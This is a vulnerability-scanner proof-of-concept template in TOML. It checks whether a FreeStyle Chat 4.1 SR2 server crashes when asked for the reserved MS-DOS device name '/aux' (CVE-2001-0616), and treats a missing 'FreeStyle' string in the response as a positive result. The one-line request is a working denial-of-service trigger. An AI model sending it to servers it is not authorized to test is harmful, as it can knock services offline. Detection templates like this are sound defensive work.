[info]
author = "ave"
description = "检测 Faust Informatics FreeStyle Chat 服务器 MS-DOS 设备名拒绝服务漏洞。通过发送包含 MS-DOS 保留设备名（如 AUX）的 HTTP 请求，验证服务器是否因处理这些特殊设备名而崩溃或拒绝服务。"
id = "POC-AVE-2001-0263"
name = "Faust Informatics FreeStyle Chat 4.1 SR2 MS-DOS Device Name DoS"
severity = "medium"
tags = ["ave-2001-0263"]
vuln_id = [
    "CVE-2001-0616",
    "AVE-2001-0263",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/aux"
protocol = "http"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = ["FreeStyle"]
